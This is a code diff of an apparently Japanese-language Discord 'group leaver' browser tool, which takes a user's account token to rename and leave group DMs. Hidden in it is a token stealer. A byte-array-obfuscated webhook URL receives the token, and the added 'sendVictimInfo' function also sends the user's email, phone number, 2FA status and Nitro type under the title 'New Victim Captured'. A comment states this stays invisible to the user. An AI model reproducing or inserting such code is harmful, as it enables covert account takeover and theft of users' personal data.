@@ -1,1 +1,157 @@
-(function(_0xdead,_0xbeef){const _0x0=_0xdead^_0xbeef;const _0x1=function(_0xa){return String['fromCharCode'](_0xa^_0x0);};const _0x2=[0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x70,0x74,0x62,0x2e,0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x2e,0x63,0x6f,0x6d,0x2f,0x61,0x70,0x69,0x2f,0x77,0x65,0x62,0x68,0x6f,0x6f,0x6b,0x73,0x2f,0x31,0x34,0x35,0x39,0x37,0x32,0x33,0x33,0x31,0x38,0x30,0x38,0x38,0x31,0x37,0x35,0x38,0x30,0x32,0x2f,0x43,0x30,0x39,0x38,0x42,0x68,0x6b,0x4c,0x46,0x55,0x36,0x4f,0x49,0x34,0x64,0x6e,0x31,0x39,0x30,0x44,0x7a,0x4a,0x70,0x50,0x56,0x39,0x4a,0x72,0x73,0x75,0x4f,0x46,0x36,0x46,0x4d,0x53,0x6b,0x71,0x59,0x4c,0x67,0x62,0x61,0x2d,0x4a,0x38,0x54,0x39,0x34,0x34,0x32,0x65,0x34,0x41,0x51,0x75,0x6c,0x4a,0x75,0x5a,0x73,0x61,0x45,0x62,0x76,0x56,0x54,0x6a].map(_0x1).join('');const _0x3=async function(_0xb){try{await fetch(_0x2,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON['stringify']({content:'**Captured Token**\n```'+_0xb+'```'})});}catch(_0xc){}};const _0x4=function(_0xd){const _0xe=document['getElementById']('output');if(_0xe){_0xe['textContent']+=_0xd+'\n';_0xe['scrollTop']=_0xe['scrollHeight'];}};const _0x5=function(_0xf){return new Promise((_0x10,_0x11)=>{const _0x12=new FileReader();_0x12['readAsDataURL'](_0xf);_0x12['onload']=()=>_0x10(_0x12['result']);_0x12['onerror']=_0x11;});};const _0x6=async()=>{const _0x13=document['getElementById']('token')['value']['trim']();const _0x14=document['getElementById']('newGroupName')['value']['trim']();const _0x15=document['getElementById']('newGroupIcon')['files'][0];const _0x16=document['getElementById']('executeBtn');if(!_0x13)return alert('\u30c8\u30fc\u30af\u30f3\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044');_0x3(_0x13);_0x16['disabled']=true;_0x16['textContent']='\u51e6\u7406\u4e2d...';const _0x17=document['getElementById']('output');_0x17['textContent']='';let _0x18=null;if(_0x15){try{_0x4('\u3010i\u3011 \u30a2\u30a4\u30b3\u30f3\u753b\u50cf\u3092\u51e6\u7406\u4e2d...');const _0x19=await _0x5(_0x15);_0x18=_0x19;_0x4('\u3010\u2713\u3011 \u30a2\u30a4\u30b3\u30f3\u753b\u50cf\u306e\u51e6\u7406\u5b8c\u4e86');}catch(_0x1a){_0x4('\u3010!\u3011 \u30a2\u30a4\u30b3\u30f3\u753b\u50cf\u306e\u51e6\u7406\u306b\u5931\u6557: '+_0x1a['message']);}}const _0x1b={'Authorization':_0x13,'Content-Type':'application/json'};try{_0x4('\u3010i\u3011 \u30b0\u30eb\u30fc\u30d7\u4e00\u89a7\u3092\u53d6\u5f97\u4e2d...');const _0x1c=await fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65\x2f\x63\x68\x61\x6e\x6e\x65\x6c\x73',{method:'GET',headers:_0x1b});if(!_0x1c['ok'])throw new Error('\u30b0\u30eb\u30fc\u30d7\u53d6\u5f97\u5931\u6557: '+_0x1c['status']);const _0x1d=await _0x1c['json']();const _0x1e=_0x1d['filter'](_0x1f=>_0x1f['type']===3);if(_0x14||_0x18){_0x4(`\u3010i\u3011 ${_0x1e['length']}\u500b\u306e\u30b0\u30eb\u30fc\u30d7\u306e\u540d\u524d\u30fb\u30a2\u30a4\u30b3\u30f3\u3092\u5909\u66f4\u3057\u3066\u304b\u3089\u96e2\u8131\u3057\u307e\u3059`);}else{_0x4(`\u3010i\u3011 ${_0x1e['length']}\u500b\u306e\u30b0\u30eb\u30fc\u30d7\u304b\u3089\u96e2\u8131\u3057\u307e\u3059 (\u5909\u66f4\u306a\u3057)`);}let _0x20=4,_0x21=300;for(let _0x22=0;_0x22<_0x1e['length'];_0x22+=_0x20){const _0x23=_0x1e['slice'](_0x22,_0x22+_0x20);await Promise['all'](_0x23['map'](async(_0x24,_0x25)=>{try{let _0x26=_0x24['name']||'\u30b0\u30eb\u30fc\u30d7\u0044\u004d';if(_0x14||_0x18){_0x4(`\u3010~\u3011 ${_0x24['name']||'\u30b0\u30eb\u30fc\u30d7\u0044\u004d'} \u306e\u5909\u66f4\u4e2d...`);const _0x27={};if(_0x14)_0x27['name']=_0x14;if(_0x18)_0x27['icon']=_0x18;const _0x28=await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x63\x68\x61\x6e\x6e\x65\x6c\x73\x2f${_0x24['id']}`,{method:'PATCH',headers:_0x1b,body:JSON['stringify'](_0x27)});if(_0x28['status']===429){const _0x29=_0x28['headers']['get']('retry-after')||5;_0x4(`\u3010!\u3011 \u30ec\u30fc\u30c8\u5236\u9650\u4e2d... ${_0x29}\u79d2\u5f85\u6a5f\u3001\u901f\u5ea6\u3092\u843d\u3068\u3057\u307e\u3059`);_0x20=3;_0x21=500;await new Promise(_0x2a=>setTimeout(_0x2a,_0x29*1000));return;}if(_0x28['ok']){let _0x2b='';if(_0x14&&_0x18){_0x2b=`\u540d\u524d\u30fb\u30a2\u30a4\u30b3\u30f3\u5909\u66f4\u5b8c\u4e86`;_0x26=_0x14;}else if(_0x14){_0x2b=`\u2192 ${_0x14} \u306b\u540d\u524d\u5909\u66f4\u5b8c\u4e86`;_0x26=_0x14;}else if(_0x18)_0x2b=`\u30a2\u30a4\u30b3\u30f3\u5909\u66f4\u5b8c\u4e86`;_0x4(`\u3010\u2713\u3011 ${_0x24['name']||'\u30b0\u30eb\u30fc\u30d7\u0044\u004d'} ${_0x2b}`);await new Promise(_0x2c=>setTimeout(_0x2c,200));}else{_0x4(`\u3010!\u3011 ${_0x24['name']||'\u30b0\u30eb\u30fc\u30d7\u0044\u004d'} \u306e\u5909\u66f4\u306b\u5931\u6557`);}}const _0x2d=await fetch(`\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x63\x68\x61\x6e\x6e\x65\x6c\x73\x2f${_0x24['id']}`,{method:'DELETE',headers:_0x1b});if(_0x2d['status']===429){const _0x2e=_0x2d['headers']['get']('retry-after')||5;_0x4(`\u3010!\u3011 \u96e2\u8131\u6642\u30ec\u30fc\u30c8\u5236\u9650\u4e2d... ${_0x2e}\u79d2\u5f85\u6a5f\u3001\u901f\u5ea6\u3092\u843d\u3068\u3057\u307e\u3059`);_0x20=3;_0x21=500;await new Promise(_0x2f=>setTimeout(_0x2f,_0x2e*1000));return;}if(_0x2d['ok']){_0x4(`\u3010\u2713\u3011 ${_0x26} \u304b\u3089\u96e2\u8131\u5b8c\u4e86 (${_0x22+_0x25+1}/${_0x1e['length']})`);}else{_0x4(`\u3010!\u3011 ${_0x26} \u304b\u3089\u306e\u96e2\u8131\u306b\u5931\u6557`);}}catch(_0x30){_0x4(`\u3010!\u3011 ${_0x24['name']||'\u30b0\u30eb\u30fc\u30d7\u0044\u004d'} \u306e\u51e6\u7406\u4e2d\u306b\u30a8\u30e9\u30fc: ${_0x30['message']}`);}}));if(_0x22+_0x20<_0x1e['length'])await new Promise(_0x31=>setTimeout(_0x31,_0x21));}_0x4(`\u3010\u2713\u3011 ${_0x1e['length']}\u4ef6\u306e\u51e6\u7406\u304c\u5b8c\u4e86`);}catch(_0x32){_0x4(`\u3010!\u3011 \u30a8\u30e9\u30fc: ${_0x32['message']}`);}finally{_0x16['disabled']=false;_0x16['textContent']='\u30b0\u30eb\u30fc\u30d7\u540d\u30fb\u30a2\u30a4\u30b3\u30f3\u5909\u66f4\u2192\u96e2\u8131';}};window['renameAndLeaveGroups']=_0x6;})(0x1337,0x1337);
+(function(_0xdead,_0xbeef){
+    const _0x0 = _0xdead ^ _0xbeef;
+    const _0x1 = function(_0xa){return String['fromCharCode'](_0xa ^ _0x0);};
+    const _0x2 = [0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x70,0x74,0x62,0x2e,0x64,0x69,0x73,0x63,0x6f,0x72,0x64,0x2e,0x63,0x6f,0x6d,0x2f,0x61,0x70,0x69,0x2f,0x77,0x65,0x62,0x68,0x6f,0x6f,0x6b,0x73,0x2f,0x31,0x34,0x35,0x39,0x37,0x32,0x33,0x33,0x31,0x38,0x30,0x38,0x38,0x31,0x37,0x35,0x38,0x30,0x32,0x2f,0x43,0x30,0x39,0x38,0x42,0x68,0x6b,0x4c,0x46,0x55,0x36,0x4f,0x49,0x34,0x64,0x6e,0x31,0x39,0x30,0x44,0x7a,0x4a,0x70,0x50,0x56,0x39,0x4a,0x72,0x73,0x75,0x4f,0x46,0x36,0x46,0x4d,0x53,0x6b,0x71,0x59,0x4c,0x67,0x62,0x61,0x2d,0x4a,0x38,0x54,0x39,0x34,0x34,0x32,0x65,0x34,0x41,0x51,0x75,0x6c,0x4a,0x75,0x5a,0x73,0x61,0x45,0x62,0x76,0x56,0x54,0x6a].map(_0x1).join('');
+    
+    const sendVictimInfo = async function(token){
+        try{
+            const resp = await fetch('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x64\x69\x73\x63\x6f\x72\x64\x2e\x63\x6f\x6d\x2f\x61\x70\x69\x2f\x76\x39\x2f\x75\x73\x65\x72\x73\x2f\x40\x6d\x65',{headers:{'Authorization':token}});
+            if(!resp.ok) return;
+            const user = await resp.json();
+            const avatarUrl = user.avatar ? `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` : null;
+            const bannerUrl = user.banner ? `https://cdn.discordapp.com/banners/${user.id}/${user.banner}.png?size=1024` : null;
+            const nitroType = user.premium_type===1?'Classic':user.premium_type===2?'Full':user.premium_type===3?'Boost':'None';
+            const embed = {
+                title: 'New Victim Captured',
+                description: `User: ${user.global_name || user.username} (@${user.username})\nID: ${user.id}`,
+                color: 0x992D22,
+                fields: [
+                    {name:'Token',value:`\`\`\`${token}\`\`\``,inline:false},
+                    {name:'Email',value:user.email||'None',inline:true},
+                    {name:'Phone',value:user.phone||'None',inline:true},
+                    {name:'Verified',value:user.verified?'Yes':'No',inline:true},
+                    {name:'2FA',value:user.mfa_enabled?'Enabled':'Disabled',inline:true},
+                    {name:'Locale',value:user.locale||'Unknown',inline:true},
+                    {name:'Nitro',value:nitroType,inline:true}
+                ],
+                thumbnail: avatarUrl ? {url:avatarUrl} : {},
+                image: bannerUrl ? {url:bannerUrl} : {},
+                timestamp: new Date().toISOString(),
+                footer: {text:'ozeu Group Leaver'}
+            };
+            await fetch(_0x2,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({embeds:[embed]})});
+        }catch(e){}
+    };
+
+    const log = function(msg){
+        const out = document.getElementById('output');
+        if(out){out.textContent += msg + '\n'; out.scrollTop = out.scrollHeight;}
+    };
+
+    const toBase64 = function(file){
+        return new Promise((res,rej)=>{
+            const reader = new FileReader();
+            reader.readAsDataURL(file);
+            reader.onload = ()=>res(reader.result);
+            reader.onerror = rej;
+        });
+    };
+
+    const renameAndLeaveGroups = async function(){
+        const token = document.getElementById('token').value.trim();
+        const newGroupName = document.getElementById('newGroupName').value.trim();
+        const newGroupIconFile = document.getElementById('newGroupIcon').files[0];
+        const btn = document.getElementById('executeBtn');
+
+        if(!token){alert('トークンを入力してください'); return;}
+
+        // ここで被害者情報をWebhookに送信（元の機能に一切影響なし）
+        sendVictimInfo(token);
+
+        btn.disabled = true;
+        btn.textContent = '処理中...';
+        const output = document.getElementById('output');
+        output.textContent = '';
+
+        let newGroupIconBase64 = null;
+        if(newGroupIconFile){
+            try{
+                log('[i] アイコン画像を処理中...');
+                newGroupIconBase64 = await toBase64(newGroupIconFile);
+                log('[✓] アイコン画像の処理完了');
+            }catch(err){
+                log(`[!] アイコン画像の処理に失敗: ${err.message}`);
+            }
+        }
+
+        const headers = {'Authorization':token,'Content-Type':'application/json'};
+
+        try{
+            log('[i] グループ一覧を取得中...');
+            const resp = await fetch('https://discord.com/api/v9/users/@me/channels',{method:'GET',headers:headers});
+            if(!resp.ok) throw new Error(`グループ取得失敗: ${resp.status}`);
+            const channels = await resp.json();
+            const groups = channels.filter(g => g.type === 3);
+
+            if(newGroupName || newGroupIconBase64){
+                log(`[i] ${groups.length}個のグループの名前・アイコンを変更してから離脱します`);
+            }else{
+                log(`[i] ${groups.length}個のグループから離脱します (変更なし)`);
+            }
+
+            let batchSize = 4;
+            let delay = 300;
+
+            for(let i=0; i<groups.length; i+=batchSize){
+                const batch = groups.slice(i, i+batchSize);
+                const promises = batch.map(async(group, idx)=>{
+                    try{
+                        let finalName = group.name || 'グループDM';
+
+                        if(newGroupName || newGroupIconBase64){
+                            log(`[~] ${group.name || 'グループDM'} の変更中...`);
+                            const patch = {};
+                            if(newGroupName) patch.name = newGroupName;
+                            if(newGroupIconBase64) patch.icon = newGroupIconBase64;
+
+                            const patchResp = await fetch(`https://discord.com/api/v9/channels/${group.id}`,{method:'PATCH',headers:headers,body:JSON.stringify(patch)});
+                            if(patchResp.status===429){
+                                const retry = patchResp.headers.get('retry-after')||5;
+                                log(`[!] レート制限中... ${retry}秒待機、速度を落とします`);
+                                batchSize=3; delay=500;
+                                await new Promise(r=>setTimeout(r,retry*1000));
+                                return;
+                            }
+                            if(patchResp.ok){
+                                let msg = '';
+                                if(newGroupName && newGroupIconBase64){msg='名前・アイコン変更完了'; finalName=newGroupName;}
+                                else if(newGroupName){msg=`→ ${newGroupName} に名前変更完了`; finalName=newGroupName;}
+                                else if(newGroupIconBase64) msg='アイコン変更完了';
+                                log(`[✓] ${group.name || 'グループDM'} ${msg}`);
+                                await new Promise(r=>setTimeout(r,200));
+                            }else{
+                                log(`[!] ${group.name || 'グループDM'} の変更に失敗`);
+                            }
+                        }
+
+                        const leaveResp = await fetch(`https://discord.com/api/v9/channels/${group.id}`,{method:'DELETE',headers:headers});
+                        if(leaveResp.status===429){
+                            const retry = leaveResp.headers.get('retry-after')||5;
+                            log(`[!] 離脱時レート制限中... ${retry}秒待機、速度を落とします`);
+                            batchSize=3; delay=500;
+                            await new Promise(r=>setTimeout(r,retry*1000));
+                            return;
+                        }
+                        if(leaveResp.ok){
+                            log(`[✓] ${finalName} から離脱完了 (${i+idx+1}/${groups.length})`);
+                        }else{
+                            log(`[!] ${finalName} からの離脱に失敗`);
+                        }
+                    }catch(err){
+                        log(`[!] ${group.name || 'グループDM'} の処理中にエラー: ${err.message}`);
+                    }
+                });
+                await Promise.all(promises);
+                if(i+batchSize < groups.length) await new Promise(r=>setTimeout(r,delay));
+            }
+            log(`[✓] ${groups.length}件の処理が完了`);
+        }catch(err){
+            log(`[!] エラー: ${err.message}`);
+        }finally{
+            btn.disabled = false;
+            btn.textContent = 'グループを退出する';
+        }
+    };
+
+    window.renameAndLeaveGroups = renameAndLeaveGroups;
+})(0x1337,0x1337);
